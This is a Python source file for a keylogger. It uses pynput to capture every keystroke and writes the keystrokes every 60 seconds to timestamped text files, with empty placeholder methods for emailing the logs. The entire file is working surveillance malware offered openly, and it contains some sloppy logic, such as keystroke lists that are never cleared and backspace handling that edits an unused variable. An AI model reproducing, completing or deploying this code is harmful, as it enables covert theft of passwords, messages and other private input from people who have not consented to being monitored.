from pynput.keyboard import Key,Listener
from datetime import datetime
from threading import Timer

TIME_INTERVAL = 60

class Keylogger:
    # all the required parameters for the keylogger
    def __init__(self, interval, report_method="file"):
        # Interval time
        self.interval = interval
        self.report_method = report_method
        # Variable to conatine log of all keystrokes during the interval
        self.li_keys = []
        # date time 
        self.start_dt = datetime.now()
        self.stop_dt = datetime.now()

    # function to get executed on every keyboard event
    def callback(self, key):
        if key == Key.space:        
            self.li_keys.append(" ")    
        else:        
            self.li_keys.append(key)


    # update the file name if storing to file with the date time
    def update_filename(self):
        start_dt_str = str(self.start_dt) [:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.stop_dt) [:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}-{end_dt_str}"

    # save to log to the filename
    def report_to_file(self, li_keys):
        # open a file with the following name
        with open(f"{self.filename}.txt", "w") as f:
            for i in li_keys:
                k = str(i).replace("'","")
                if i == Key.backspace:
                    self.log = self.log[:-1]
                elif i == Key.up:
                    f.write(" (up) ")
                elif i == Key.down:
                    f.write(" (down) ")
                elif i == Key.right:
                    f.write(" (right) ")
                elif i == Key.left:
                    f.write(" (left) ")
                elif i == Key.enter:
                    f.write("[ENTER]\n")
                elif i == Key.ctrl_l:
                    f.write(" [CTRL_L] ")
                elif i == Key.shift : 
                    f.write(" [SHIFT] ")
                elif i == Key.tab : 
                    f.write(" [TAB] ")
                elif i == Key.alt_l: 
                    f.write(" [ALT_L] ")
                elif i == Key.esc:
                    f.write(" [ ESC ] ")
                else:
                    f.write(k)


    def prepare_email(self):
        # logic for creating a new email like body, subjet and all.
        pass

    def sent_email(self):
        # logic to send email
        pass

    # function to save the file
    def report(self):
        if self.li_keys:
            # get the stop Date
            self.stop_dt = datetime.now()
            # update file name
            self.update_filename()
            # If request method is email then write email function
            if self.report_method == "email":
                # email function logic
                self.sent_email()
            # save to the file
            elif self.report_method == "file":
                self.report_to_file(self.li_keys)
        # reset the log variable to empty
        self.log = ""
        # call report function after internal
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    # start logging function
    def start(self):
        # start time
        self.start_dt = datetime.now()
        # log function
        with Listener(on_press = self.callback, interval=self.report()) as l:
            l.join()
        # save funtion
        # keep running
        # kb.wait()

# call the function with the methods on script execution.
if __name__ == '__main__':
    # keylogger = Keylogger(interval=SAVE_FILE_EVERY, report_methods="email") // For Email
    keylogger = Keylogger(interval=TIME_INTERVAL, report_method="file")
    keylogger.start()


